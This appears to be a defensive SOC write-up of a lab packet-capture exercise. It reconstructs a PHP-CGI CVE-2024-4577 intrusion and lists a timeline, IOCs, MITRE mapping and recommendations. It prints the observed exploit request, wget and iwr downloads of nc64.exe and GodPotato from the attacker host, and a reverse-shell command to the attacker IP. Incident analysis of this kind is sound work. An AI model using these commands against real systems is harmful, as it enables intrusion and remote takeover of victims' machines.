# 🧩 Packet Puzzle — SOC Investigation Report

## 📌 Overview

Suspicious internal network activity was detected at a cryptocurrency trading company. A packet capture was exported for analysis to determine whether the environment was compromised and to reconstruct attacker actions.

This investigation confirms successful exploitation of a vulnerable web service, remote command execution, payload delivery, and an attempted privilege escalation.

**Case Type:** Network Intrusion Investigation
**Data Source:** PCAP
**Attacker IP:** 192.168.170.128
**Victim IP:** 192.168.170.130

---

## 🧠 Skills Demonstrated

* PCAP analysis
* Port-scan reconstruction
* Exploit identification
* Command reconstruction
* Payload tracking
* Timeline building
* MITRE mapping
* Incident reporting

---

## 🛠️ Tools Used

* Wireshark
* TCP Stream analysis
* HTTP reconstruction

---

## 🧭 Investigation Summary

* Attacker performed internal port scan
* 8 services identified as open
* PHP-CGI vulnerability exploited
* Remote command execution achieved
* Reverse shell downloaded
* Privilege escalation attempted using GodPotato
* Escalation failed

---

## 1️⃣ Reconnaissance

The attacker at **192.168.170.128** scanned the victim host **192.168.170.130**.

Findings:

* 8 open ports discovered
* First responding port: **22**

Evidence:
<img width="1908" height="967" alt="Screenshot 2026-02-18 053416" src="https://github.com/user-attachments/assets/871a55d6-6255-4982-a4f6-c4aa8e32d1c9" />

---

## 2️⃣ Exploitation

HTTP traffic shows exploitation of PHP-CGI argument injection.

Observed payload:

```
POST /?%ADd+allow_url_include=1+-d+auto_prepend_file=php://input
```

This confirms exploitation of:
**CVE-2024-4577**
Product: **PHP 8.1.25**

MITRE Technique:
**T1190 — Exploit Public-Facing Application**

Evidence:
<img width="1912" height="975" alt="Screenshot 2026-02-18 053533" src="https://github.com/user-attachments/assets/be661218-77db-4f4c-b74f-a59f8258918b" />

---

## 3️⃣ Initial Foothold

Attacker executed commands on the host via web shell.

Timestamp:
**2025-01-22 09:47:32**

Victim account identified:
**cristo**

Evidence:

<img width="631" height="112" alt="Screenshot 2026-02-18 053612" src="https://github.com/user-attachments/assets/5c06cb19-dc58-46dc-86e3-f6b81e76c601" />

---

## 4️⃣ Payload Download

Attacker downloaded a reverse shell payload.

Command observed:

```
wget http://192.168.170.128:9696/nc64.exe -o time.exe
```

Then downloaded privilege escalation tool:

```
iwr https://github.com/.../GodPotato-NET4.exe -Outfile TimeProvider.exe
```

Evidence:
<img width="1371" height="1087" alt="Screenshot 2026-02-18 053605" src="https://github.com/user-attachments/assets/410d17f7-ec1e-4de1-8c0e-4b71866bc8d8" />

---

## 5️⃣ Privilege Escalation Attempt

Attacker executed:

```
./TimeProvider.exe -cmd "time.exe 192.168.170.128 5555 -e cmd"
```

Tool used:
**GodPotato-NET4.exe**

Goal:
Escalate privileges to SYSTEM.

Evidence:
<img width="1371" height="1087" alt="Screenshot 2026-02-18 053605" src="https://github.com/user-attachments/assets/1c2afad4-34a8-40af-914b-ae7ba6af2815" />

---

## 6️⃣ Escalation Failure

The attempt failed with error:

```
Cannot create process Win32Error:2
```

Evidence:
<img width="1368" height="771" alt="Screenshot 2026-02-18 053612" src="https://github.com/user-attachments/assets/59ed0c6c-90e1-4122-b96d-e40386eea94c" />

---

## ⏱️ Timeline

| Time     | Event                     |
| -------- | ------------------------- |
| 09:45:27 | Port scan begins          |
| 09:46:09 | PHP exploit sent          |
| 09:47:32 | Initial foothold achieved |
| 09:48:00 | Payload downloaded        |
| 09:48:xx | Priv-esc attempted        |
| 09:48:xx | Priv-esc failed           |

---

## 📍 Indicators of Compromise

Attacker IP: 192.168.170.128
Victim IP: 192.168.170.130
User: cristo
Payload: GodPotato-NET4.exe
Reverse shell: nc64.exe

---

## 🗺️ MITRE ATT&CK Mapping

| Technique                 | ID    |
| ------------------------- | ----- |
| Exploit Public-Facing App | T1190 |
| Command Execution         | T1059 |
| Ingress Tool Transfer     | T1105 |
| Privilege Escalation      | T1068 |

---

## 🚨 Impact

* Remote code execution achieved
* Attacker gained shell access
* Privilege escalation attempted
* SYSTEM access attempt failed
* Host considered compromised

---

## 🛡️ Recommendations

* Patch PHP to fixed version
* Monitor internal scanning
* Restrict outbound downloads
* Implement EDR
* Block exploit patterns
* Enforce application allow-listing

---

## 🧾 Conclusion

The attacker exploited a vulnerable PHP service to gain remote code execution, downloaded tools for persistence and privilege escalation, and attempted to elevate privileges using GodPotato. Although the escalation failed, the host was fully compromised and required containment and remediation.

